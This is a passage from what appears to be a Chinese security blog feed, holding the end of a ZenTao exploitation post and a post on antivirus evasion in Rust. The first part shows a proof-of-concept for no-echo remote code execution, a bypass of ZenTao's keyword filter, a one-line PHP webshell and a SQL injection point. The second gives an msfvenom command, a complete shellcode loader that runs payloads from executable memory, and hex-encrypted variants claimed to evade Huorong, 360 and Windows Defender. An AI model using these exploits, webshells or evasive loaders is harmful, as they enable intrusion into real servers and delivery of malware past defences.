class="hljs-string">&quot;&amp;account=&amp;password=&amp;encrypt=&amp;acl[groups][]=1&amp;acl[users][]=&amp;desc=&amp;uid=&quot;</span><br>        exec_url = <span class="hljs-string">&#x27;/www/index.php?m=repo&amp;f=edit&amp;repoID=&amp;objectID=&#x27;</span><br><br>        exec_rep = session.post(url=url + exec_url,data=data2,headers=headers)<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = url<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br>                                <br>register_poc(DemoPOC)<br></code></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>这里需要注意两个点：由于禅道采用的是MVC架构，所有它存在两种路由访问方法。<br>第一点：<br>第一种就是文章所写的由 <code>index.php</code>来调用模块、方法。<br>第二种就是伪静态路由&#x2F;<code>zentao/my-team.html</code>，<code>my</code>模块<code>team</code>方法来用进行调用。<br>所以需要自己来判断禅道的路由情况，来进行利用。<br>第二点：<br>此次RCE利用执行命令是无回显的，需要自己判断服务器状态，或者写入WebShell。<br>但是写入Webshell再禅道中有限制，再<code>fileterTrojan($var)</code>方法中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"> $evils    = array(<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;proc_open&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>);<br>$replaces = array(<span class="hljs-string">&#x27;e v a l&#x27;</span>, <span class="hljs-string">&#x27;e x e c&#x27;</span>, <span class="hljs-string">&#x27;p a s s t h r u&#x27;</span>, <span class="hljs-string">&#x27;p r o c _ o p e n&#x27;</span>, <span class="hljs-string">&#x27;s h e l l _ e x e c&#x27;</span>, <span class="hljs-string">&#x27;s y s t e m&#x27;</span>, <span class="hljs-string">&#x27;$ $&#x27;</span>, <span class="hljs-string">&#x27;i n c l u d e&#x27;</span>, <span class="hljs-string">&#x27;r e q u i r e&#x27;</span>, <span class="hljs-string">&#x27;a s s e r t&#x27;</span>);<br>$var      = str_ireplace($evils, $replaces, $var);<br></code></pre></td></tr></table></figure><p>可以看到，一些关键词会被替换，无法正常执行命令，此时需要进行绕过。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1679659201942-418d4127-c957-494b-9162-2c92cb25d7da.png" alt="image.png"></p><p>上传文件，123.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_POST</span>[_](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1679659311621-8a2eebf1-2d5a-4931-9552-70a28b2abb28.png" alt="image.png"><br>PHP高版本无法正常执行命令(system….)，PHP低版本可以正常执行。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1679659535655-3ac7de8c-1dee-486a-ab1d-a90bdf432161.png" alt="image.png"></p><h3 id="漏洞挖掘（SQL注入）"><a href="#漏洞挖掘（SQL注入）" class="headerlink" title="漏洞挖掘（SQL注入）"></a>漏洞挖掘（SQL注入）</h3><p>注入漏洞1：<code>convert\model\dbExists</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dbExists</span>(<span class="hljs-params"><span class="hljs-variable">$dbName</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SHOW DATABASES like &#x27;<span class="hljs-subst">&#123;$dbName&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;dbh-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>很简单的一个语句，搜索一下哪个方法调用了这个模块<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1680683482500-9a9d0a05-4ed5-4fd0-a483-12c887a2802e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1680683499164-8de2a94b-65f2-403b-af20-4a734fe99eb0.png" alt="image.png"><br>对应后台功能点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1680683527836-a48d117a-32f1-41c8-bfc1-74a7b180e156.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1680683589703-aaaef061-e969-4785-8e30-06dac6c7683d.png" alt="image.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>Net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rust 分离免杀</title>
    <link href="/2022/08/09/Rust%20%E5%85%8D%E6%9D%80%EF%BC%88%E5%88%86%E7%A6%BB%EF%BC%89/"/>
    <url>/2022/08/09/Rust%20%E5%85%8D%E6%9D%80%EF%BC%88%E5%88%86%E7%A6%BB%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>项目地址：<a href="https://github.com/b1tg/rs_shellcode">GitHub - b1tg&#x2F;rs_shellcode: Another shellcode runner 🦀 🐚</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/exec CMD=calc<span class="hljs-selector-class">.exe</span>  <span class="hljs-attr">--platform</span> win -f raw -o calc64<span class="hljs-selector-class">.raw</span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1660548775653-3cbee06c-d0de-4e76-9779-7f87837a346b.png#averageHue=%23cfd9a5&clientId=ubf9f1965-b945-4&from=paste&height=656&id=u5e83d62c&originHeight=984&originWidth=2054&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144006&status=done&style=none&taskId=u4112fa10-5bf1-404d-a3e8-b56e369580c&title=&width=1369.3333333333333" alt="image.png"></p><p>项目源码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![feature(pattern)]</span><br><br><span class="hljs-comment">// #![windows_subsystem = &quot;windows&quot;]</span><br><span class="hljs-keyword">use</span> bindings::windows::win32::system_services::VirtualAlloc;<br><span class="hljs-keyword">use</span> clap::&#123;App, Arg&#125;;<br><span class="hljs-keyword">use</span> std::arch::asm;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">matches</span> = App::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;rs_shellcode&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<br>            Arg::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;file&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">short</span>(<span class="hljs-string">&#x27;f&#x27;</span>)<br>                .<span class="hljs-title function_ invoke__">about</span>(<span class="hljs-string">&quot;shellcode path&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">takes_value</span>(<span class="hljs-literal">true</span>)<br>                .<span class="hljs-title function_ invoke__">required</span>(<span class="hljs-literal">true</span>),<br>        )<br>        .<span class="hljs-title function_ invoke__">arg</span>(<br>            Arg::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;breakpoint&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">short</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>                .<span class="hljs-title function_ invoke__">about</span>(<span class="hljs-string">&quot;set breakpoint in debugger&quot;</span>),<br>        )<br>        .<span class="hljs-title function_ invoke__">arg</span>(<br>            Arg::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;offset&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">short</span>(<span class="hljs-string">&#x27;o&#x27;</span>)<br>                .<span class="hljs-title function_ invoke__">about</span>(<span class="hljs-string">&quot;shellcode offset&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">takes_value</span>(<span class="hljs-literal">true</span>),<br>        )<br>        .<span class="hljs-title function_ invoke__">get_matches</span>();<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">set_breakpoint</span> = matches.<span class="hljs-title function_ invoke__">is_present</span>(<span class="hljs-string">&quot;breakpoint&quot;</span>);<br>    <span class="hljs-keyword">if</span> set_breakpoint &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[*] Breakpoint flag set!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">fp</span>: <span class="hljs-type">String</span> = matches.<span class="hljs-title function_ invoke__">value_of_t</span>(<span class="hljs-string">&quot;file&quot;</span>).<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|e| e.<span class="hljs-title function_ invoke__">exit</span>());<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">offset</span>: <span class="hljs-type">u64</span> = <span class="hljs-keyword">match</span> matches.<span class="hljs-title function_ invoke__">value_of</span>(<span class="hljs-string">&quot;offset&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(offset) =&gt; &#123;<br>            <span class="hljs-keyword">if</span> offset.<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-string">&quot;0x&quot;</span>) == <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">let</span> <span class="hljs-variable">without_prefix</span> = offset.<span class="hljs-title function_ invoke__">trim_start_matches</span>(<span class="hljs-string">&quot;0x&quot;</span>);<br>                <span class="hljs-type">u64</span>::<span class="hljs-title function_ invoke__">from_str_radix</span>(without_prefix, <span class="hljs-number">16</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(<span class="hljs-number">0</span>)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">u64</span>::<span class="hljs-title function_ invoke__">from_str_radix</span>(offset, <span class="hljs-number">10</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(<span class="hljs-number">0</span>)<br>            &#125;<br>        &#125;<br>        _ =&gt; <span class="hljs-number">0</span>,<br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[*] Reading shellcode from path: &#123;:?&#125;&quot;</span>, fp.<span class="hljs-title function_ invoke__">clone</span>());<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">contents</span> = <span class="hljs-keyword">match</span> std::fs::<span class="hljs-title function_ invoke__">read</span>(fp) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading shellcode error: &#123;&#125;&quot;</span>, e);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">flen</span> = contents.<span class="hljs-title function_ invoke__">len</span>();<br><br>    <span class="hljs-keyword">if</span> flen <span class="hljs-keyword">as</span> <span class="hljs-type">u64</span> &lt;= offset &#123;<br>        <span class="hljs-built_in">println!</span>(<br>            <span class="hljs-string">&quot;[-] Offset too big, offset: &#123;&#125;, file length: &#123;&#125;&quot;</span>,<br>            offset, flen<br>        );<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf</span> = <span class="hljs-keyword">unsafe</span> &#123;<br>        <span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>            std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>            flen,<br>            MEM_COMMIT | MEM_RESERVE,<br>            PAGE_EXECUTE_READWRITE,<br>        )<br>    &#125;;<br>    <span class="hljs-keyword">if</span> new_buf == std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Failed to allocate memory&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf_ptr</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> = new_buf <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-keyword">unsafe</span> &#123; std::ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(contents.<span class="hljs-title function_ invoke__">as_ptr</span>(), new_buf_ptr, flen) &#125;;<br>    <span class="hljs-built_in">println!</span>(<br>        <span class="hljs-string">&quot;[*] Starting jmp to shellcode at offset 0x&#123;:x&#125; (base virtual address: &#123;:p&#125;)&quot;</span>,<br>        offset, new_buf_ptr<br>    );<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">jmp_target</span> = new_buf.<span class="hljs-title function_ invoke__">offset</span>(offset <span class="hljs-keyword">as</span> <span class="hljs-type">isize</span>);<br>        <span class="hljs-keyword">if</span> set_breakpoint &#123;<br>            asm!(<span class="hljs-string">&quot;int 3&quot;</span>);<br>        &#125;<br>        asm!(<span class="hljs-string">&quot;jmp &#123;&#125;&quot;</span>,<span class="hljs-title function_ invoke__">in</span>(reg) jmp_target)<br>    &#125;;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>源码分析</strong></p><blockquote><p>matches 为命令行参数解释 clap模块</p></blockquote><p>set_breakpoint -b 参数 指定断点运行<br>fp 读取文件函数 -f<br>offset -o 指定偏移量</p><p>contents <code>std::fs::read(fp)</code>将文件的全部内容读入字节向量。ok(res)<br>flen &#x3D; contents.len()  &#x2F;&#x2F;contents 长度</p><p>new_buf 不安全的操作  通过virtualalloc 写入内存</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">VirtualAlloc</span>(<br>    lpaddress: <span class="hljs-type">Option</span>&lt;*<span class="hljs-keyword">const</span> c_void&gt;,<br>    dwsize: <span class="hljs-type">usize</span>,<br>    flallocationtype: VIRTUAL_ALLOCATION_TYPE,<br>    flprotect: PAGE_PROTECTION_FLAGS<br>) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> c_void<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>           std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(), <span class="hljs-comment">//C端空指针</span><br>           flen,<span class="hljs-comment">//contents长度</span><br>           MEM_COMMIT | MEM_RESERVE,<br>           PAGE_EXECUTE_READWRITE,<br>       )<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br></code></pre></td></tr></table></figure><h2 id="自写（分离免杀）"><a href="#自写（分离免杀）" class="headerlink" title="自写（分离免杀）"></a>自写（分离免杀）</h2><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><strong>读取功能</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![feature(pattern)]</span><br><br><span class="hljs-comment">// #![windows_subsystem = &quot;windows&quot;]</span><br><span class="hljs-keyword">use</span> bindings::windows::win32::system_services::VirtualAlloc;<br><span class="hljs-keyword">use</span> std::arch::asm;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">fp</span>: &amp;<span class="hljs-type">str</span> = <span class="hljs-string">&quot;calc64.raw&quot;</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">contents</span> = <span class="hljs-keyword">match</span> std::fs::<span class="hljs-title function_ invoke__">read</span>(fp) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">flen</span> = contents.<span class="hljs-title function_ invoke__">len</span>();<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;shellcode: &#123;:?&#125;&quot;</span>,contents);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;shellcode_len: &#123;&#125;&quot;</span>, flen);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>内存加载</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf</span> = <span class="hljs-keyword">unsafe</span> &#123;<br><span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>flen,<br>MEM_COMMIT | MEM_RESERVE,<br>PAGE_EXECUTE_READWRITE,<br>)<br>&#125;;<br><span class="hljs-keyword">if</span> new_buf == std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>()&#123;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Failed to allocate memory&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf_ptr</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> = new_buf <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> <span class="hljs-keyword">as</span> _;<br><span class="hljs-keyword">unsafe</span> &#123;std::ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(contents, new_buf_ptr, flen)&#125;;<br><br><span class="hljs-built_in">println!</span>(<br><span class="hljs-string">&quot;[*] Starting jmp to shellcode at offset 0x (base virtual address: &#123;:p&#125;)&quot;</span>,<br>new_buf_ptr<br>);<br><br><span class="hljs-keyword">unsafe</span> &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">jmp_target</span> = new_buf_ptr;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,jmp_target);<br><br>asm!(<span class="hljs-string">&quot;jmp &#123;&#125;&quot;</span>,<span class="hljs-title function_ invoke__">in</span>(reg) jmp_target)<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>编译后进行测试</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669959935822-5bc5aca6-7259-4968-bd76-8c5e528c1a00.png#averageHue=%23b4bd72&clientId=u145b2b54-a9f6-4&from=paste&height=797&id=u9f1315ce&originHeight=1195&originWidth=2141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=301737&status=done&style=none&taskId=ud0ce18c1-2d30-4ed2-a2d9-d3490671a6b&title=&width=1427.3333333333333" alt="image.png"><br>文件被查杀</p><h3 id="使用自写hex加密"><a href="#使用自写hex加密" class="headerlink" title="使用自写hex加密"></a>使用自写hex加密</h3><p>将raw文件进行加密<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669960543345-a3e5d498-b8f5-4372-8b31-c24342b74ece.png#averageHue=%23f6f6f6&clientId=u145b2b54-a9f6-4&from=paste&height=615&id=u40b6bfb3&originHeight=923&originWidth=2034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=235532&status=done&style=none&taskId=ua0e71bf9-2306-4a33-bf35-1060d3e0fc6&title=&width=1356" alt="image.png"></p><h3 id="绕过效果"><a href="#绕过效果" class="headerlink" title="绕过效果"></a>绕过效果</h3><p><strong>火绒</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669963713362-c47619f8-4160-491a-aa91-9bc7437e9991.png#averageHue=%23ebe2d0&clientId=u145b2b54-a9f6-4&from=paste&height=637&id=u766524dd&originHeight=955&originWidth=2185&originalType=binary&ratio=1&rotation=0&showTitle=false&size=362509&status=done&style=none&taskId=u0e476163-29be-4032-9912-5f2d62b3a72&title=&width=1456.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669962749861-e074245d-924d-440a-bd0f-5a64c9c91c88.png#averageHue=%2366892c&clientId=u145b2b54-a9f6-4&from=paste&height=865&id=udb440559&originHeight=1298&originWidth=2539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=306501&status=done&style=none&taskId=ua643fa57-8ab5-4885-97db-af80441b8b7&title=&width=1692.6666666666667" alt="image.png"><br><strong>360</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965411849-1f305322-5f1a-40ee-8a26-3dc6ef2e123f.png#averageHue=%2390908f&clientId=u145b2b54-a9f6-4&from=paste&height=566&id=uc2313fd3&originHeight=849&originWidth=2247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=325268&status=done&style=none&taskId=ue3fa4ab8-150b-4625-a9e7-1c1fd8a19f8&title=&width=1498" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965577408-1cb18a4e-0c8c-474f-88f0-fdb56f05ae4c.png#averageHue=%23a8976b&clientId=u145b2b54-a9f6-4&from=paste&height=762&id=u8d387d59&originHeight=1143&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=323987&status=done&style=none&taskId=ud096abd2-887d-46f4-945e-2fe62d239f5&title=&width=964.6666666666666" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965629454-d655d4ee-fac9-4d91-9f55-c210bef9013b.png#averageHue=%23f9f9f8&clientId=u145b2b54-a9f6-4&from=paste&height=577&id=ubbf8fad3&originHeight=865&originWidth=1389&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142378&status=done&style=none&taskId=ue811848f-030b-4ade-aea9-d7d64adf981&title=&width=926" alt="image.png"><br><strong>windows defender</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965799453-92b5ecd4-4d6a-4e44-9749-6392ee89a34b.png#averageHue=%23c2b066&clientId=u145b2b54-a9f6-4&from=paste&height=723&id=u7701e48c&originHeight=1085&originWidth=2063&originalType=binary&ratio=1&rotation=0&showTitle=false&size=266601&status=done&style=none&taskId=u4cfb9c84-94fe-4d63-af02-d9c071caa00&title=&width=1375.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965866911-cc06d6ce-49db-4bd0-904f-8262cd95513a.png#averageHue=%23ccaf6a&clientId=u145b2b54-a9f6-4&from=paste&height=693&id=ue16851f7&originHeight=1040&originWidth=2550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=426130&status=done&style=none&taskId=u5b4af2eb-6990-4408-b637-4e427fa0a83&title=&width=1700" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669966475423-1937d16b-098a-46f0-86fb-05ee2dc5626f.png#averageHue=%23187d13&clientId=u916ed136-0794-4&from=paste&height=426&id=u214302c8&originHeight=639&originWidth=1153&originalType=binary&ratio=1&rotation=0&showTitle=false&size=187131&status=done&style=none&taskId=u14b28ea9-31b6-49c7-b72f-c8625ea1e95&title=&width=768.6666666666666" alt="image.png"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 